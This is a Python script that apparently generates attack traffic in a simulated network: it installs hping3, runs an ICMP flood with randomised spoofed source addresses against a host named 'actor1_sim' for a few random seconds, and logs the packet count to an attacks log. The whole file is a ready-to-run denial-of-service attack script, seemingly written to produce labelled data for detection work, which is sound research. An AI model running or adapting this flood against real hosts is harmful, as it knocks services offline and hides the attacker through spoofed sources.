# Send an ICMP flood attack using hping3 
import os
import subprocess
import time
import random
import signal
import re
import socket

# Randomized prep and attack durations to avoid synchronized runs
prep_time = random.randint(5, 10)   # seconds to wait before launching attack
attack_time = random.randint(5, 10) # duration of the attack in seconds

subprocess.run("apk update && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hping3", shell=True)

print(f"Waiting for {prep_time} seconds before starting ICMP flood...")
time.sleep(prep_time)

print(f"Starting ICMP flood attack for {attack_time} seconds...")

start = time.time()

result = socket.getaddrinfo("actor1_sim", None)
dst_ip = result[0][4][0]
result = socket.getaddrinfo(socket.gethostname(), None)
src_ip = result[0][4][0]

proc = subprocess.Popen(
    f"hping3 --icmp actor1_sim --flood --rand-source",
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)
time.sleep(attack_time)

# Stop the attack
proc.send_signal(signal.SIGINT)
stop = time.time()
length = stop - start

try:
    stdout, stderr = proc.communicate(timeout=2)
except subprocess.TimeoutExpired:
    proc.kill()
    stdout, stderr = proc.communicate()
output = (stdout or "") + (stderr or "")

num_packets = 0
m = re.search(r"([0-9]+) packets tramitted", output)
if m:
    try:
        num_packets = int(m.group(1))
    except ValueError:
        num_packets = 0

log_line = f"{start},{num_packets},{src_ip},{dst_ip},ICMP\n"
try:
    with open("logs/attacks.log", "a") as f:
        f.write(log_line)
except Exception as e:
    print(f"ICMP attacker: Error writing to log file: {e}")

print("ICMP flood finished")
